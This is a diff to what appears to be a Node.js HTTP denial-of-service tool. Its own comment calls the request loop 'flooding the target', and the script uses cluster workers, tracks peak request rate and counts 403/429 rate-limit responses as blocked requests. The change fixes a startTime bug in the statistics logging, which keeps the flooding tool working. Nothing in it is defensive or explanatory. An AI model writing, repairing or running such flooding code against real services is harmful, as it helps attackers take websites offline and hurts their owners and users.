@@ -54,7 +54,7 @@ function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-function logStats() {
+function logStats(startTime) {
   const elapsedTime = Math.max((Date.now() - startTime) / 1000, 1);
   const rps = totalRequests / elapsedTime;
   peakRps = Math.max(peakRps, rps);
@@ -101,7 +101,8 @@ if (cluster.isMaster) {
 
   const client = isHttps ? https : http;
 
-  let startTime = Date.now();
+  // Initialize startTime for the worker
+  const startTime = Date.now();
 
   // Request loop for flooding the target
   function requestLoop() {
@@ -117,14 +118,14 @@ if (cluster.isMaster) {
         } else if (res.statusCode === 403 || res.statusCode === 429) {
           blockedRequests++;
         }
-        logStats();
+        logStats(startTime); // Pass startTime to logStats function
       });
     });
 
     req.on('error', (e) => {
       totalRequests++;
       console.error(`Error: ${e.message}`);
-      logStats();
+      logStats(startTime); // Pass startTime to logStats function
     });
   }
 
